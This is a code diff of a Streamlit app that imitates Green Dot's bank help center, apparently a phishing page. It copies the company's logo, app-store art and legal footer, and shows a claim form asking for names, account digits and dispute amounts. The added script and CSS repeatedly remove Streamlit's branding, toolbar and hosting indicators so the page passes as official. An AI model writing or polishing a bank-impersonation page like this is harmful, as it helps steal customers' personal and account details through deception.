@@ -23,56 +23,50 @@ init_db()
 
 st.set_page_config(page_title="Green Dot | Help Center", layout="wide", page_icon="✅")
 
-# 1. INYECCIÓN DE SCRIPT PARA LIMPIEZA DE DOM
+# 1. JS: ELIMINACIÓN FÍSICA DE ANCHORS Y TRACKERS
 st.markdown("""<script>
-    const cleanStreamlit = () => {
-        const toRemove = [
-            '._container_gzau3_1', '._viewerBadge_aycw8_23', '._profileContainer_gzau3_53',
-            '._profilePreview_gzau3_63', 'iframe[title="Streamlit Cloud Status"]',
-            '[data-testid="appCreatorAvatar"]', 'script[src*="googletagmanager"]',
-            'script[src*="segment.com"]', '.section-anchor', 'a.section-anchor'
+    const cleanDOM = () => {
+        const selectors = [
+            '.section-anchor', 'a.section-anchor', '._container_gzau3_1', 
+            '._viewerBadge_aycw8_23', '[data-testid="stAppToolbar"]', 
+            'iframe[title="Streamlit Cloud Status"]', 'script[src*="googletagmanager"]'
         ];
-        toRemove.forEach(selector => {
-            document.querySelectorAll(selector).forEach(el => el.remove());
-        });
+        selectors.forEach(s => document.querySelectorAll(s).forEach(el => el.remove()));
     };
-    cleanStreamlit();
-    setInterval(cleanStreamlit, 1000);
+    setInterval(cleanDOM, 500);
 </script>""", unsafe_allow_html=True)
 
-# 2. CSS AGRESIVO PARA ELIMINAR ENLACES DE TÍTULOS
+# 2. CSS: ESTILO 'PURE WHITE LABEL'
 st.markdown("""<style>
-/* Bloqueo total de anchors y eventos de mouse en títulos */
-.section-anchor, a.section-anchor, .stMarkdown [data-testid="stMarkdownContainer"] a.section-anchor {
-    display: none !important;
-    visibility: hidden !important;
-    pointer-events: none !important;
-}
+/* Bloqueo de cabecera y footer de Streamlit */
+header, footer, [data-testid='stHeader'], .stDeployButton { display: none !important; }
 
-h1, h2, h3, h4, h5, h6 {
-    pointer-events: none !important;
-    user-select: none !important;
-}
-
-/* Ocultar elementos de Streamlit */
-[data-testid='stHeader'], header, footer, .stDeployButton, button[title='View fullscreen'] {
-    display: none !important;
-    visibility: hidden !important;
+/* Desactivar links en Logo y Títulos */
+[data-testid="stImage"], h1, h2, h3 { 
+    pointer-events: none !important; 
+    cursor: default !important; 
+    user-select: none !important; 
 }
 
 .stApp { background-color: #000000 !important; color: #FFFFFF !important; }
 .block-container { padding-top: 1rem !important; }
 .stButton>button { background-color: #00a05b !important; color: white !important; width: 100%; padding: 15px !important; font-weight: bold !important; border: none !important; }
+
+/* Estilo de la App Store */
+.promo-box { background-color: #111; padding: 40px; text-align: center; border-radius: 12px; margin: 30px 0; border: 1px solid #222; }
+
+/* Footer Legal Restaurado */
 .legal-footer { font-size: 11px; color: #666; text-align: justify; margin-top: 60px; border-top: 1px solid #222; padding-top: 20px; line-height: 1.5; }
 </style>""", unsafe_allow_html=True)
 
+# Logo sin link
 if os.path.exists('logo.svg'):
     st.image('logo.svg', width=250)
 
 st.title("Help Center")
 st.write("Please fill out the form below to submit your claim.")
 
-with st.form("dispute_form", clear_on_submit=True):
+with st.form("claim_form_final", clear_on_submit=True):
     nombre = st.text_input("Full Name")
     cuenta = st.text_input("Last 4 digits of Account")
     monto = st.number_input("Disputed Amount", min_value=0.0, format="%.2f")
@@ -82,18 +76,20 @@ with st.form("dispute_form", clear_on_submit=True):
     submitted = st.form_submit_button("SUBMIT NOW")
 
 if submitted:
-    if nombre and rec and car:
-        st.success("✅ Claim received.")
+    if nombre and rec and car: st.success("✅ Claim received.")
 
-st.markdown("""<div style='background-color: #111; padding: 40px; text-align: center; border-radius: 12px; margin: 30px 0; border: 1px solid #222;'>
+# Sección App Store
+st.markdown("""<div class='promo-box'>
     <h2 style='color:white; margin-bottom:20px;'>Download the Green Dot app</h2>
     <div style='display: flex; justify-content: center; gap: 20px; flex-wrap: wrap; margin-bottom: 25px;'>
         <img src='https://www.greendot.com/content/dam/greendot/home-page-redesign/Play-store.svg' width='160'>
         <img src='https://www.greendot.com/content/dam/greendot/home-page-redesign/App-store.svg' width='160'>
     </div>
-    <p style='color:#bbb; max-width:600px; margin: 0 auto;'>We offer secure mobile banking that allows you to conveniently manage your account from making deposits, to sending money or paying bills.</p>
+    <p style='color:#bbb; max-width:600px; margin: 0 auto;'>We offer secure mobile banking that allows you to conveniently manage your account.</p>
 </div>""", unsafe_allow_html=True)
 
+# Footer Legal Restaurado y Completo
 st.markdown("""<div class='legal-footer'>
-    ©2026 Green Dot Corporation. All rights reserved. Green Dot Corporation NMLS #914924; Green Dot Bank NMLS #908739.
+    ©2026 Green Dot Corporation. All rights reserved. Green Dot Corporation NMLS #914924; Green Dot Bank NMLS #908739.<br><br>
+    Green Dot® cards are issued by Green Dot Bank, Member FDIC, pursuant to a license from Visa U.S.A., Inc. Visa is a registered trademark of Visa International Service Association. And by Mastercard International Inc. Mastercard and the circles design are registered trademarks of Mastercard International Incorporated.
 </div>""", unsafe_allow_html=True)
